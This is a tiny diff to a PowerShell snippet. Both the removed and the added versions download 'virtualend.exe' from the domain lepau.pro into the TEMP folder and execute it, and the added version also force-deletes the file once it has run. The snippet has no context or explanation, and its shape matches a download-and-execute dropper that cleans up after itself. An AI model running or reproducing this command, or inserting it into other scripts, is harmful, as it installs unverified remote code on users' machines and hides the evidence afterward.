@@ -1,1 +1,4 @@
-iwr lepau.pro/virtualend.exe -OutFile $env:TEMP\virtualend.exe; & $env:TEMP\virtualend.exe
+$exe = "$env:TEMP\virtualend.exe"
+iwr lepau.pro/virtualend.exe -OutFile $exe
+$p = Start-Process $exe -Wait -PassThru
+Remove-Item $exe -Force
